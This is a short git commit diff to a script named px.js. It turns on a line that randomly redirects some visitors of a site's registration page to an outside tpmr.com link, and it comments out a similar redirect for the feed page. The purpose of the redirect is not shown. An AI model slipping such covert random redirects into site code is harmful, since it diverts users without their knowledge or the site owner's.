842b7dcea9f796c5ca6d3398b8cfc709930d0b1f
Aleksandr Mironenko <baffipelo@gmail.com>
2019-06-27 21:45:03 +0300

    Update px.js

--- px.js
+++ px.js
@@ -2,9 +2,11 @@ var urlParams = new URLSearchParams(window.location.search); var myParam = urlPa
 var foo = (Math.random() * (10 - 1) + 1)>7;
 
 if (foo && (document.location.pathname == '/forms/registration/')){
- //document.location.replace('http://tpmr.com/i/66194'); 
+ document.location.replace('http://tpmr.com/i/66194'); 
 }
  
+/*
 if (foo && (document.location.pathname == '/feed/')){
 //document.location.replace('http://tpmr.com/i/66230'); 
 }
+*/
